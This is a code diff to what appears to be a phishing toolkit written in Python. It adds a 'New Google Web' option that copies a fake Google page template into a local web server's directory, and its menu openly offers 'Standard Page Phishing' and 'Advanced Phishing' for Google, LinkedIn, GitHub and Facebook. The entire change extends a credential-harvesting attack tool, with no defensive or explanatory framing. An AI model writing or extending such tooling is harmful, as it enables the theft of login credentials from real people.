@@ -84,7 +84,9 @@ def runPhishing(social, option2):
     elif option2 == '1' and social == 'Google':
         system('cp WebPages/google_standard/*.* Server/www/')
     elif option2 == '2' and social == 'Google':
-        system('cp WebPages/google_advanced_poll/*.* Server/www/')   
+        system('cp WebPages/google_advanced_poll/*.* Server/www/')
+    elif option2 == '3' and social == 'Google':
+        system('cp WebPages/google_advanced_web/*.* Server/www/')   
     elif social == 'LinkedIn':
         system('cp WebPages/linkedin/*.* Server/www/')
     elif social == 'GitHub':
@@ -170,7 +172,7 @@ def runPEnv():
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
